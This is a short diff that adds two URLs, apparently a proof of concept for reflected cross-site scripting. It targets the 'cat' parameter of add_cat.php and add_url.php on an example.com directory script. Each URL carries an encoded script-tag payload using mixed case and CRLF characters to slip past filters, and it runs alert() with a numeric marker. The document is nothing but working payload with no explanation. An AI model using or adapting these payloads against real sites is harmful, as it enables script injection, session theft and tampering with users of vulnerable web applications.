@@ -1,0 +1,4 @@
+http://www.example.com/dir/add_cat.php?cat=1&gt;&#039;&gt;&lt;ScRiPt %0A%0D&gt;alert(308857346746)%3B&lt;/ScRiPt&gt;
+http://www.example.com/dir/add_url.php?cat=1&gt;&#039;&gt;&lt;ScRiPt %0A%0D&gt;alert(317287773544)%3B&lt;/ScRiPt&gt;
+
+
